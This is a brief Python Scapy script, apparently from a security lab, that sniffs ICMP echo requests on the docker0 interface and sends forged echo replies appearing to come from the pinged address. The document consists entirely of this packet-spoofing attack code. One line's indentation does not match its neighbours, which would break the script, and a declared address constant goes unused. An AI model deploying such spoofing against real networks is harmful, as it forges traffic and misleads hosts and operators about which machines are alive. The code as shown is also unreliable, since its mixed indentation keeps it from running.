#! /usr/bin/python

from scapy.all import *

IP_A = '1.2.3.4'


def spoof_pkt(pkt):
	if ICMP in pkt and pkt[ICMP].type == 8:
		print("Original Packet........")
		print("Source IP:", pkt[IP].src)
		print("Destination IP:", pkt[IP].dst)
	    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
		ip.ttl = 99
		icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
		
		if pkt.haslayer(Raw):
			data = pkt[Raw].load
			newpkt = ip/icmp/data
		else:
			newpkt = ip/icmp

		print("Spoofed Packet....")
		print("Source IP:", newpkt[IP].src)
		print("Destination IP:", newpkt[IP].dst)

		send(newpkt, verbose=0)

sniff (iface = 'docker0', filter = 'icmp', prn=spoof_pkt)

